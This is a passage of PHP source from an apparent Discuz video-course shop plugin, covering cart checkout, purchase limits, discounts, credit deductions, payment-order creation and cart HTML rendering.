						$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_video_sale')." where it618_gtypeid=".$it618_gtypeid." and it618_time>$time and it618_state=1 and it618_uid=".$uid);
					}
					if($buycount=='')$buycount=0;
					
					$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
					if($it618_video_goods_type['it618_xgcount']>0&&$it618_count>$it618_video_goods_type['it618_xgcount']-$buycount){
						if($it618_video_goods_type['it618_xgtime']==0){
							echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.it618_video_getlang('s1139').$it618_video_goods_type['it618_xgcount'].it618_video_getlang('s1140').$buycount.it618_video_getlang('s1141');it618_video_delsalework();exit;
						}else{
							echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.it618_video_getlang('s1142').$it618_video_goods_type['it618_xgtime'].it618_video_getlang('s1143').$it618_video_goods_type['it618_xgcount'].it618_video_getlang('s1140').$buycount.it618_video_getlang('s1141');it618_video_delsalework();exit;
						}
					}
				}
			}else{
				if($lid==0&&$vid==0){
					$goods_count=$it618_video_goods['it618_count'];
					$goods_price=$it618_video_goods['it618_saleprice'];
					$goods_jfid=$it618_video_goods['it618_jfid'];
					$goods_score=$it618_video_goods['it618_score'];
				}
				
				if($lid>0&&$vid==0){
					$it618_video_goods_lesson = C::t('#it618_video#it618_video_goods_lesson')->fetch_by_id($lid);
					$goods_count=$it618_video_goods_lesson['it618_count'];
					$goods_price=$it618_video_goods_lesson['it618_saleprice'];
					$goods_jfid=$it618_video_goods_lesson['it618_jfid'];
					$goods_score=$it618_video_goods_lesson['it618_score'];
				}
				
				if($lid>0&&$vid>0){
					$it618_video_goods_video = C::t('#it618_video#it618_video_goods_video')->fetch_by_id($vid);
					$goods_count=$it618_video_goods_video['it618_count'];
					$goods_price=$it618_video_goods_video['it618_saleprice'];
					$goods_jfid=$it618_video_goods_video['it618_jfid'];
					$goods_score=$it618_video_goods_video['it618_score'];
				}
			}
			
			$videopower_sale=it618_video_getpower_sale($uid,$pid,$lid,$vid);
			if($videopower_sale['state']==1){
				echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.$videopower_sale['about'];it618_video_delsalework();exit;
			}
			
			if($it618_video_goods['it618_xgtype']==1){
				
				$timetmp1=explode(" ",$it618_video_goods['it618_xgtime1']);
				$timetmp2=explode(" ",$it618_video_goods['it618_xgtime2']);
				$timetmp11=explode("-",$timetmp1[0]);
				$timetmp12=explode(":",$timetmp1[1]);
				$timetmp21=explode("-",$timetmp2[0]);
				$timetmp22=explode(":",$timetmp2[1]);
				
				
				$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
				$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
				
				if($etime<$_G['timestamp']){
					echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.$it618_video_lang['s1055'];it618_video_delsalework();exit;
				}else{
					if($btime>$_G['timestamp']){
						echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.$it618_video_lang['s1056'];it618_video_delsalework();exit;
					}
				}
			}
			
			if($it618_video_goods['it618_xgtype']==2){
				$timetmp1=explode(" ",$it618_video_goods['it618_xgtime1']);
				$timetmp2=explode(" ",$it618_video_goods['it618_xgtime2']);
				$timetmp11=explode("-",$timetmp1[0]);
				$timetmp12=explode(":",$timetmp1[1]);
				$timetmp21=explode("-",$timetmp2[0]);
				$timetmp22=explode(":",$timetmp2[1]);
				
				$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
				$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
				
				if($etime<$_G['timestamp']){
					echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.$it618_video_lang['s1055'];it618_video_delsalework();exit;
					
				}else{
					if($btime>$_G['timestamp']){
						echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.$it618_video_lang['s1056'];it618_video_delsalework();exit;
					}else{
						$btimecur=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j'), date('Y'));
						$btimecur1=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j')+1, date('Y'));
						$etimecur=mktime($timetmp22[0], $timetmp22[1], 0, date('n'), date('j'), date('Y'));
						
						if($btimecur>$_G['timestamp']){
							echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.$it618_video_lang['s1056'];it618_video_delsalework();exit;
						}
						
						if($etimecur<$_G['timestamp']){
							echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.$it618_video_lang['s1056'];it618_video_delsalework();exit;
						}
					}
				}
			}

			if($goods_score>0){
				if(C::t('#it618_video#it618_video_jfhl')->count_by_jfid_isok($goods_jfid)==0){
					echo  'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.it618_video_getlang('s1108');it618_video_delsalework();exit;
				}
			}
			
			if($IsGroup==1){
				$vipzk=it618_video_getvipzk($pid);
			}
			
			if($vipzk>0){
				$goods_price=$goods_price*$vipzk/100;
				$goods_score=intval($goods_score*$vipzk/100);
			}
			
			if($it618_video_gwc['it618_price']>0){
				$goods_price=$it618_video_gwc['it618_price'];
			}
			
			if($it618_video_gwc['it618_pricescore']>0){
				$goods_score=$it618_video_gwc['it618_pricescore'];
			}
			
			$summoney=$goods_price*$it618_count-$it618_video_gwc['it618_quanmoney'];
			
			$allsummoney=$allsummoney+$summoney;
			
			if($goods_score>0){
				$allsumscore[$goods_jfid]+=$goods_score*$it618_count;
			}
	
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			
			$id = C::t('#it618_video#it618_video_gwcsale')->insert(array(
				'it618_gwcid' => 0,
				'it618_uid' => $uid,
				'it618_shopid' => $it618_video_gwc['it618_shopid'],
				'it618_pid' => $it618_video_gwc['it618_pid'],
				'it618_lid' => $it618_video_gwc['it618_lid'],
				'it618_vid' => $it618_video_gwc['it618_vid'],
				'it618_gtypeid' => $it618_gtypeid,
				'it618_tuijid' => $it618_tuijid,
				'it618_count' => $it618_count,
				'it618_price' => $goods_price,
				'it618_jfid' => $goods_jfid,
				'it618_score' => $goods_score,
				'it618_quanmoney' => $it618_video_gwc['it618_quanmoney'],
				'it618_vipzk' => $vipzk,
				'it618_sfmoney' => $summoney,
				'it618_sfscore' => $goods_score*$it618_count,
				'it618_tel' => it618_video_utftogbk($_GET["it618_tel"]),
				'it618_jfbl' => $it618_video_goods['it618_jfbl'],
				'it618_time' => $tmptime
			), true);

		}
		
		for($i=1;$i<=8;$i++){
			if($allsumscore[$i]>0){
				$jfname=$_G['setting']['extcredits'][$i]['title'];
				
				$creditnum=DB::result_first("select extcredits".$i." from ".DB::table('common_member_count')." where uid=".$_G['uid']);
				if($creditnum<$allsumscore[$i]){
					echo it618_video_getlang('s1121').$creditnum.$jfname.it618_video_getlang('s1122');it618_video_delsalework();exit;
				}
				$gwcscorestr.=$allsumscore[$i].$jfname.' ';
			}
		}
		
		$gwcid = C::t('#it618_video#it618_video_gwcsale_main')->insert(array(
			'it618_uid' => $uid,
			'it618_state' => 0,
			'it618_time' => $tmptime
		), true);
			
		C::t('#it618_video#it618_video_gwcsale')->update_gwcid_by_uid($gwcid,$uid);
		
		if($allsummoney==0){
			for($i=1;$i<=8;$i++){
				if($allsumscore[$i]>0){
					C::t('common_member_count')->increase($uid, array(
						'extcredits'.$i => (0-$allsumscore[$i]))
					);
				}
			}
			
			C::t('#it618_video#it618_video_gwcsale_main')->update($gwcid,array(
				'it618_moneybz' => $gwcscorestr,
				'it618_state' => 1
			));
			
			foreach(C::t('#it618_video#it618_video_gwcsale')->fetch_all_by_gwcid($gwcid) as $it618_video_gwcsale) {
						
				$id = C::t('#it618_video#it618_video_sale')->insert(array(
					'it618_gwcid' => $it618_video_gwcsale['it618_gwcid'],
					'it618_shopid' => $it618_video_gwcsale['it618_shopid'],
					'it618_uid' => $it618_video_gwcsale['it618_uid'],
					'it618_pid' => $it618_video_gwcsale['it618_pid'],
					'it618_lid' => $it618_video_gwcsale['it618_lid'],
					'it618_vid' => $it618_video_gwcsale['it618_vid'],
					'it618_gtypeid' => $it618_video_gwcsale['it618_gtypeid'],
					'it618_tuijid' => $it618_video_gwcsale['it618_tuijid'],
					'it618_price' => $it618_video_gwcsale['it618_price'],
					'it618_jfid' => $it618_video_gwcsale['it618_jfid'],
					'it618_score' => $it618_video_gwcsale['it618_score'],
					'it618_count' => $it618_video_gwcsale['it618_count'],
					'it618_quanmoney' => $it618_video_gwcsale['it618_quanmoney'],
					'it618_vipzk' => $it618_video_gwcsale['it618_vipzk'],
					'it618_sfmoney' => $it618_video_gwcsale['it618_sfmoney'],
					'it618_sfscore' => $it618_video_gwcsale['it618_sfscore'],
					'it618_jfbl' => $it618_video_gwcsale['it618_jfbl'],
					'it618_tel' => $it618_video_gwcsale['it618_tel'],
					'it618_state' => 1,
					'it618_time' => $it618_video_gwcsale['it618_time']
				), true);
				
				if($it618_video_gwcsale['it618_tuijid']>0){
					require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
					Union_TuiTC_Add($it618_video_gwcsale['it618_tuijid'],$id);
				}
				
				$it618_video_sale=C::t('#it618_video#it618_video_sale')->fetch_by_id($id);
				it618_video_updategoodscount($it618_video_sale);
				it618_video_qrxf($id);

				if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			}
			
			$it618_video_gwcsale_main = C::t('#it618_video#it618_video_gwcsale_main')->fetch_by_id($gwcid);
			
			C::t('#it618_video#it618_video_gwcsale')->delete_by_uid($it618_video_gwcsale_main['it618_uid']);
			C::t('#it618_video#it618_video_gwc')->delete_by_uid($it618_video_gwcsale_main['it618_uid']);

			it618_video_sendmessage('gwc_user',$it618_video_gwcsale_main['id']);
			foreach(C::t('#it618_video#it618_video_sale')->fetch_all_shopid_by_gwcid($it618_video_gwcsale_main['id']) as $shopids) {
				it618_video_sendmessage('gwc_shop',$it618_video_gwcsale_main['id'],$shopids['it618_shopid']);
			}
			it618_video_sendmessage('gwc_admin',$it618_video_gwcsale_main['id']);
			
			echo 'it618_splitjfokit618_split';it618_video_delsalework();exit;
		}else{
			if($_GET['paytype']==""){
				echo it618_video_getlang('s1069');it618_video_delsalework();exit;
			}	
		}
		
		C::t('#it618_video#it618_video_gwcsale_main')->update($gwcid,array(
			'it618_moneybz' => $allsummoney.it618_video_getlang('s125').' '.$gwcscorestr
		));
		
		foreach(C::t('#it618_video#it618_video_gwc')->fetch_all_shopid_by_uid($uid) as $shopids) {
			$quanid=intval($_GET['quanid'.$shopids['it618_shopid']]);
			if($quanid>0){
				DB::query("update ".DB::table('it618_union_quansale')." set it618_gwcid=$id,it618_usetime=$tmptime,it618_state=1 where id=".$quanid);
			}
		}
		
		for($i=1;$i<=8;$i++){
			if($allsumscore[$i]>0){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$i => (0-$allsumscore[$i]))
				);
			}
		}
		
		$saletype='0302';
		$saleid=$gwcid;
		$out_trade_no = date("YmdHis").$saletype.$saleid;
		
		$body=str_replace("money",$allsummoney,$it618_video_lang['s1098']);
		$body=str_replace("gwcid",$gwcid,$body);
		
		$total_fee=$allsummoney;
		
		if(video_is_mobile()){ 
			$wap=1;
			$url=$_G['siteurl'].it618_video_getrewrite('video_wap','uc@'.$uid,'plugin.php?id=it618_video:wap&pagetype=uc');
		}else{
			$wap=0;
			$url=$_G['siteurl'].it618_video_getrewrite('video_gwcmysale','','plugin.php?id=it618_video:gwc&mysale');
		}
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
		$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
		$tmparr=explode("it618_split",$domainurl_paytype);
		$domainurl=$tmparr[0];
		$paytype=$tmparr[1];

		C::t('#it618_credits#it618_credits_salepay')->insert(array(
			'it618_out_trade_no' => $out_trade_no,
			'it618_uid' => $uid,
			'it618_saletype' => $saletype,
			'it618_saleid' => $saleid,
			'it618_paytype' => $paytype,
			'it618_url' => $url,
			'it618_body' => $body,
			'it618_total_fee' => round($total_fee,2),
			'it618_plugin' => 'it618_video',
			'it618_wap' => $wap,
			'it618_state' => 0,
			'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
			'it618_time' => $_G['timestamp']
		), true);
	
		$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
		
		echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;it618_video_delsalework();
	}
	exit;
}


if($_GET['ac']=="getpay"){
	if($uid>0){
		$pid=intval($_GET['pid']);
		$lid=intval($_GET['lid']);
		$vid=intval($_GET['vid']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);
		
		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($pid);
		
		if($lid==0&&$vid==0){
			$it618_video_price = C::t('#it618_video#it618_video_goods')->fetch_by_id($pid);
		}
		if($lid>0&&$vid==0){
			$it618_video_price = C::t('#it618_video#it618_video_goods_lesson')->fetch_by_id($lid);
		}
		if($lid>0&&$vid>0){
			$it618_video_price = C::t('#it618_video#it618_video_goods_video')->fetch_by_id($vid);
		}
		
		if($it618_video['video_saletel']==2){
			$isbd='ok';
			if($it618_members_user=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_user')." WHERE it618_uid=".$_G['uid'])){
				$tel=$it618_members_user['it618_tel'];
			}else{
				echo 'it618_splittelbd';exit;
			}
		}else{
			$tel=C::t('#it618_video#it618_video_sale')->fetch_tel_by_uid($_G['uid']);
		}
		
		if($it618_gtypeid>0){
			if($it618_video_goods_type=C::t('#it618_video#it618_video_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_price=$it618_video_goods_type['it618_saleprice'];
				$goods_jfid=$it618_video_goods_type['it618_jfid'];
				$goods_score=$it618_video_goods_type['it618_score'];
				$gtypename = it618_video_gettypename($it618_video_goods_type['id']);
			}
		}else{
			$goods_price=$it618_video_price['it618_saleprice'];
			$goods_jfid=$it618_video_price['it618_jfid'];
			$goods_score=$it618_video_price['it618_score'];
		}
		
		if($IsGroup==1){
			$vipzk=it618_video_getvipzk($pid);
		}
		
		if($vipzk>0){
			$goods_price=round($goods_price*$vipzk/100,2);
			$goods_score=intval($goods_score*$vipzk/100);
		}
		
		$yfmoney=$goods_price*$it618_count;
		if($goods_score>0){
			$goodsjfname=$_G['setting']['extcredits'][$goods_jfid]['title'];
			$sumscore[$goods_jfid]+=$goods_score*$it618_count;
		}
		
		if($it618_video_goods['it618_jfbl']>0&&$goods_price>0){
			$jfbl='<font color=#888>'.it618_video_getlang('s1049').'<font color=red>'.$it618_video_goods['it618_jfbl'].'%</font> '.$creditname.'</font>';
		}
		
		for($i=1;$i<=8;$i++){
			if($sumscore[$i]>0){
				$jfname=$_G['setting']['extcredits'][$i]['title'];
				
				$scorestr.=$sumscore[$i].$jfname.' + ';
				
				$creditnum=C::t('#it618_video#it618_video_sale')->fetch_extcredits_by_uid($i,$_G['uid']);
				if($creditnum=="")$creditnum=0;
				$jfcounttmp.='<font color="red">'.$creditnum.'</font>'.$jfname;
			}
		}
		
		if($scorestr!=''){
			$scorestr.='@';
			$scorestr=str_replace(' + @',"",$scorestr);
			
			$jfcountstr=$it618_video_lang['s1107'].' '.$jfcounttmp;
		}
		
		if($yfmoney>0&&$scorestr!=''){
			$yfmoneystr='<input type="hidden" id="yfmoneyvalue" value="'.$yfmoney.'"><em>&yen;</em><span id="yfmoney">'.$yfmoney.'</span>'.' + '.$scorestr;
			$moneyscore=1;
		}else{
			if($yfmoney>=0){
				$yfmoneystr='<input type="hidden" id="yfmoneyvalue" value="'.$yfmoney.'"><em>&yen;</em><span id="yfmoney">'.$yfmoney.'</span>';
			}
			if($scorestr!=''){
				$yfmoneystr=$scorestr;
			}
		}
		
		if($yfmoney>0){
			if($_GET['wap']==1){
				$it618paystr=it618_video_pay('paywap',$it618_video_lang['t357']);
			}else{
				$it618paystr=it618_video_pay('pay',$it618_video_lang['t357']);
			}
		}
		
		if($IsUnion==1){
			$isquanstr=1;
			if($yfmoney>0){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
				
				$quanstr=it618_union_getquansale('video',$it618_video_goods['it618_shopid'],$_GET['wap'],$it618_video_goods['id'],$yfmoney);
				$tmparr=explode("<select",$quanstr);
				if(count($tmparr)==1){
					$isquanstr=0;
				}
			}else{
				$quanstr='<input type="hidden" id="quanid" value="0">';
				$isquanstr=0;
			}
		}
		
		if($isquanstr==1){
			if($_GET['wap']==1){
				$getpaystr.='
				<tr>
				<td>'.$it618_video_lang['t375'].'</td>
				<td>
				'.$quanstr.'
				</td>
				</tr>';
			}else{
				$getpaystr.='
				<tr>
				<td>'.$it618_video_lang['t375'].'</td>
				<td>
				'.$quanstr.'
				</td>
				</tr>';
			}
		}else{
			$getpaystr.='
				<tr style="display:none">
				<td></td>
				<td>
				'.$quanstr.'
				</td>
				</tr>';
		}
		
		if($yfmoneystr!=''){
			if($_GET['wap']==1){
				$getpaystr.='
				<tr>
				<td width="68">'.$it618_video_lang['t195'].'</td>
				<td class="tdyfmoney">
				<span class="yfmoney">'.$yfmoneystr.'</span><input type="hidden" id="moneyscore" value="'.$moneyscore.'" />
				<div>'.$jfbl.$jfcountstr.'</div>
				</td>
				</tr>';
			}else{
				$getpaystr.='
				<tr>
				<td width="80">'.$it618_video_lang['t195'].'</td>
				<td class="tdyfmoney">
				<span style="float:right">'.$jfbl.$jfcountstr.'</span><span class="yfmoney">'.$yfmoneystr.'</span><input type="hidden" id="moneyscore" value="'.$moneyscore.'" />
				</td>
				</tr>';
			}
		}
		
		if($isbd!='ok'){
			$getpaystr.='
			<tr>
			<td>'.$it618_video_lang['t377'].'</td>
			<td>
			<input type="text" class="txt" id="it618_tel" name="it618_tel" maxlength="11"  value="'.$tel.'" /> '.$it618_video_lang['t215'].'
			</td>
			</tr>';
		}else{
			$getpaystr.='<input type="hidden" class="txt" id="it618_tel" name="it618_tel" maxlength="11"  value="'.$tel.'" />';
		}
		
		echo 'it618_splitokit618_split'.$getpaystr.$it618paystr;
	}
	exit;
}


if($_GET['ac']=="getgwc"){
	if($uid>0){
		$count=C::t('#it618_video#it618_video_gwc')->count_by_uid_pid_lid_vid_gtypeid($uid,$_GET['pid'],$_GET['lid'],$_GET['vid'],$_GET['it618_gtypeid']);
		if($count>0){
			echo '2';
		}else{
			$pid=intval($_GET['pid']);
			
			if($IsGroup==1){
				$salepower=it618_video_groupsalepower($pid);
				if($salepower==1){
					echo it618_video_getlang('s1554');exit;
				}
				if($salepower==2){
					echo it618_video_getlang('s1555');exit;
				}
			}
			
			$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($pid);
			
			if($IsUnion==1&&$_GET['tuijcode']!=''){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
				$it618_tuijid=Union_IsTuiJoin('video',$pid,$_GET['tuijcode']);
			}
			
			C::t('#it618_video#it618_video_gwc')->insert(array(
				'it618_uid' => $uid,
				'it618_pid' => $pid,
				'it618_lid' => $_GET['lid'],
				'it618_vid' => $_GET['vid'],
				'it618_shopid' => $it618_video_goods['it618_shopid'],
				'it618_gtypeid' => $_GET['it618_gtypeid'],
				'it618_tuijid' => $it618_tuijid,
				'it618_count' => $_GET['it618_count']
			), true);
			
			$count=C::t('#it618_video#it618_video_gwc')->count_by_uid($uid);
			echo '1it618_split'.$count;
		}
	}else{
		echo $it618_video_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="gwclist_get"){
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$count=C::t('#it618_video#it618_video_gwc')->count_by_uid($uid);
	$funname='getgwclist';
	
	$allsummoney=0;
	foreach(C::t('#it618_video#it618_video_gwc')->fetch_all_by_uid($uid) as $it618_video_gwc) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_gwc['it618_pid']);
		$it618_video_shop = C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_goods['it618_shopid']);
		
		$pid=$it618_video_gwc['it618_pid'];
		$lid=$it618_video_gwc['it618_lid'];
		$vid=$it618_video_gwc['it618_vid'];
		$it618_count=$it618_video_gwc['it618_count'];
		
		$gtypename='';
		if($it618_video_gwc['it618_gtypeid']>0){
			$gtypename = it618_video_gettypename($it618_video_gwc['it618_gtypeid']);
			$gtypename = '<font color=red>'.$gtypename.'</font>';
			
			$it618_video_goods_type = C::t('#it618_video#it618_video_goods_type')->fetch_by_id($it618_video_gwc['it618_gtypeid']);
			$it618_saleprice=$it618_video_goods_type['it618_saleprice'];
			$it618_salescore=$it618_video_goods_type['it618_score'];
			$it618_salejfid=$it618_video_goods_type['it618_jfid'];
			$days=$it618_video_goods_type['it618_time'];
		}else{
			if($lid==0&&$vid==0){
				$it618_saleprice=$it618_video_goods['it618_saleprice'];
				$it618_salescore=$it618_video_goods['it618_score'];
				$it618_salejfid=$it618_video_goods['it618_jfid'];
			}
			
			if($lid>0&&$vid==0){
				$it618_video_goods_lesson = C::t('#it618_video#it618_video_goods_lesson')->fetch_by_id($lid);
				$it618_saleprice=$it618_video_goods_lesson['it618_saleprice'];
				$it618_salescore=$it618_video_goods_lesson['it618_score'];
				$it618_salejfid=$it618_video_goods_lesson['it618_jfid'];
			}
			
			if($lid>0&&$vid>0){
				$it618_video_goods_video = C::t('#it618_video#it618_video_goods_video')->fetch_by_id($vid);
				$it618_saleprice=$it618_video_goods_video['it618_saleprice'];
				$it618_salescore=$it618_video_goods_video['it618_score'];
				$it618_salejfid=$it618_video_goods_video['it618_jfid'];
			}
			
			$days=0;
			$gtypename = '<font color=red>'.$it618_video_lang['s1153'].'</font>';
		}
		
		if($it618_saleprice>0&&$it618_salescore>0){
			$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
			$goodsmoneystr='&yen;{price} + {score} '.$goodsjfname;
		}else{
			if($it618_saleprice>=0){
				$goodsmoneystr='&yen;{price}';
			}
			
			if($it618_salescore>0){
				$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
				$goodsmoneystr='{score} '.$goodsjfname;
			}
		}
		
		if($it618_video_gwc['it618_iseditprice']==1){
			$it618_saleprice=$it618_video_gwc['it618_price'];
			
			$it618_salescore=$it618_video_gwc['it618_pricescore'];
		}
		
		if($IsGroup==1){
			$vipzk=it618_video_getvipzk($pid);
		}
		
		if($vipzk>0){
			$goodsmoneystr=str_replace("{price}",round($it618_saleprice*$it618_count*$vipzk/100,2),$goodsmoneystr);
			$goodsmoneystr=str_replace("{score}",intval($it618_salescore*$it618_count*$vipzk/100),$goodsmoneystr);
		}else{
			$goodsmoneystr=str_replace("{price}",round($it618_saleprice*$it618_count,2),$goodsmoneystr);
			$goodsmoneystr=str_replace("{score}",($it618_salescore*$it618_count),$goodsmoneystr);
		}
		
		$goodsmoneystr='<font color="#FF7E00">'.$goodsmoneystr.'</font> ';
		
		if($vipzk>0){
			$summoney=round($it618_saleprice*$it618_count*$vipzk/100,2);
		}else{
			$summoney=round($it618_saleprice*$it618_count,2);
		}
		
		DB::query("UPDATE ".DB::table("it618_video_gwc")." SET it618_money=".$summoney." WHERE id=".$it618_video_gwc['id']);
		
		$allsummoney=$allsummoney+$summoney;
		
		if($it618_salescore>0){
			if($vipzk>0){
				$it618_salescore=intval($it618_salescore*$it618_count*$vipzk/100);
			}
			$allsumscore[$it618_salejfid]+=$it618_salescore*$it618_count;
		}
		
		$jfblstr='';
		if($it618_video_goods['it618_jfbl']>0){
			$zsmoney=intval($it618_video_goods['it618_jfbl']*$summoney/100);
			if($zsmoney>=1){
				$jfblstr='<font color=#888>'.$it618_video_lang['s1110'].'<font color=red>'.intval($it618_video_goods['it618_jfbl']*$summoney/100).'</font>'.$creditname.'</font>';
				$allzsmoney=$allzsmoney+$zsmoney;
			}
		}
		
		if($days==0){
			if($_GET['ac1']=='pcgwc'){
				$tmpcountstr='<span style="line-height:28px">1</span>';
			}
		}else{
			$disabled='';
			$onclickstr='onclick="gwcminus('.$it618_video_gwc['id'].')"';
			if($it618_video_gwc['it618_count']==1){
				$disabled='disabled';
				$onclickstr='';
			}
			$tmpcountstr='<span class="minus '.$disabled.'" '.$onclickstr.'><i class="minus-icon"></i></span>
							<input type="text" value="'.$it618_video_gwc['it618_count'].'" readonly="readonly" />
							<span class="plus" onclick="gwcplus('.$it618_video_gwc['id'].')"><i class="plus-icon"></i></span>';
		}
		
		$goodsabout=it618_video_getgoodsabout($pid,$lid,$vid);
		
		if($vipzk>0){
			$zk=round(($vipzk/10),2);
			$zkstr=$zk.$it618_video_lang['s1551'];
			
			if($_GET['ac1']=='pcgwc'){
				$zkstr='<img src="source/plugin/it618_group/images/zk.png" style="height:18px;margin-right:1px;vertical-align:middle;margin-top:-3px"><span style="font-size:12px;color:#888">'.$zkstr.'</span><br>';
			}else{
				$zkstr='<img src="source/plugin/it618_group/images/zk.png" style="height:18px;margin-right:1px;vertical-align:middle;margin-top:-3px"><span style="font-size:12px;color:#888">'.$zkstr.'</span> ';
			}
		}

		if($_GET['ac1']=='pcgwc'){
			$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);

			$goodslist.='<div  id="gwcpid'.$it618_video_gwc['id'].'" class="cart-list cl">
							<div class="product">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="95" height="60"/></a>
							<div class="product-info">
							<p><a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'">'.$it618_video_goods['it618_name'].'</a></p>
							<p style="color:#666">'.$goodsabout['about'].'</p>
							<p style="color:#666">'.$it618_video_shop['it618_name'].'</p>
							<p><font color=red>'.$goodsabout['type'].'</font> '.$gtypename.' '.$jfblstr.'</p>
							</div>
							</div>
							<div class="money">
							<p>'.$zkstr.$goodsmoneystr.'</p>
							</div>
							<div class="quantity">
							<div class="quantity-number">
							'.$tmpcountstr.'
							</div>
							</div>
							<div class="operate">
							<p><a href="javascript:" onclick="delgwc('.$it618_video_gwc['id'].')">'.$it618_video_lang['s884'].'</a></p>
							</div>
						</div>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			
			$goodslist.='<tr id="gwcpid'.$it618_video_gwc['id'].'" class="cart-list cl"><td><table width="100%">
							<tr class="gwclisttr1"><td width="125" style="padding-left:3px">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td colspan="3" style="line-height:18px">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_video_goods['it618_name'].'</a><br>
							<font color="#666">'.$goodsabout['about'].'</font><br>
							<font color=#666>'.$it618_video_shop['it618_name'].'</font><br>
							<p><font color=red>'.$goodsabout['type'].'</font> '.$gtypename.' '.$jfblstr.'</p>
							</td></tr>
							<tr class="gwclisttr2"><td>
							</td><td style="padding-top:3px">
							<div class="quantity-number">
							'.$tmpcountstr.'
							</div>
							</td><td align="right" style="padding-top:3px; padding-right:6px" colspan="3">
							<b><font color="#FF9900">'.$zkstr.$goodsmoneystr.'</font></b> <a href="javascript:" onclick="delgwc('.$it618_video_gwc['id'].')">'.$it618_video_lang['s884'].'</a></td></tr>
						</table></td></tr>';
			
		}

	}
	
	if($it618_video['video_saletel']==2){
		$isbd='telbd';
		if($it618_members_user=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_user')." WHERE it618_uid=".$_G['uid'])){
			$tel=$it618_members_user['it618_tel'];
			$isbd='ok';
		}
	}else{
		$tel=C::t('#it618_video#it618_video_sale')->fetch_tel_by_uid($_G['uid']);
	}
	
	$userstr=it618_video_getusername($_G['uid']).'('.$_G['uid'].')';
	if($_GET['ac1']=='pcgwc'){
		$titlestr=$it618_video_lang['s1076'];
		$tmpstr='<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:130px;height:26px;border:#e8e8e8 1px solid;color:green;padding-left:3px;font-weight:bold" value="'.$tel.'" /> <font color="#999">'.$it618_video_lang['t215'].'</font>';
		
		$addrstr='<div class="buy-block-title"><span style="float:right;color:#999;">'.$userstr.'</span><h3>'.$titlestr.'</h3></div><div style="padding:10px;padding-right:0;line-height:35px">'.$tmpstr.'</div>';
	}
	
